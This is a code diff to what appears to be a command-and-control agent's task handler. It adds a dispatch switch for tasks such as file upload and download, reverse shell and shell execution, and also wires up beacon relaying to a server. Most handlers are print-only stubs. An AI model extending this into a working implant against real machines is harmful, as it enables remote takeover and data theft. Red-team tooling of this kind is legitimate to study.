@@ -33,12 +33,12 @@ void NetInst::MainLoop(){
         return;
     }
     // first thing we do is request from the server the manifest of the agent
-    ptask_t test = CreateTasking(id, TASK_PUSH_BEACON, strlen((char*)(this->t_dat)), this->t_dat);
+    ptask_t test = CreateTasking(id, AGENT_SEND_BEACON, strlen((char*)(this->t_dat)), this->t_dat);
     PushTasking(test);
 
 
     while(1){
-        printf("Within main thread loop\n");
+        printf("[NETINST] Within main thread loop\n");
         // handle tasks
         while(!task_dispatch->empty()){
             printf("Dequeueing...\n");
@@ -68,15 +68,60 @@ int NetInst::HandleTask(ptask_t task){
     printf("  TYPE: %d\n", task->type);
     printf("  LENGTH: %lu\n", task->length);
     printf("  DATA ADDRESS: %p\n", task->data);
+    int rc = 0;
 
 
     // switch depending on the type of operation
+    switch (task->type)
+    {
+    case AGENT_DIE:
+        printf("NETINST: Caught die\n");
+        break;
+    case AGENT_SLEEP:
+        printf("NETINST: Caught sleep\n");
+        break;
+    case AGENT_DOWNLOAD_FILE:
+        printf("NETINST: Caught download file\n");
+        break;
+    case AGENT_UPLOAD_FILE:
+        printf("NETINST: Caught upload file\n");
+        break;
+    case AGENT_REVERSE_SHELL:
+        printf("NETINST: Caught reverse shell\n");
+        break;
+    case AGENT_EXECUTE_SHELLSCRIPT:
+        printf("NETINST: Caught execute shell command\n");
+        break;
+    case AGENT_SEND_BEACON:
+        printf("NETINST: Caught beacon request\n");
+        {
+            // push request to agent and read data back
+            if(!api_check(tspt->push_tasking(task))) {
+                rc = 1;
+                break;
+            }
+            if(!api_check(tspt->fetch_tasking())){
+                rc = 1;
+                break;
+            }
 
+            // get the beacon data
+            char *beacon_data = (char*)((AgentJob*)this->t_dat)->get_data();
+            // push data to the server
+            ptask_t beacon = CreateTasking(0, TASK_PUSH_BEACON, strlen(beacon_data), beacon_data);
+            PushTasking(beacon);
+            printf("[NETINST] Awaiting task...\n");
+        }
+        break;
+    default:
+        log(LOG_ERROR, "Unknown tasking operation: %d", task->type);
+        break;
+    }
 
     // free the task at the end
     FreeTask(task);
     
-    return 0;
+    return rc;
 }
 
 // frees a given task
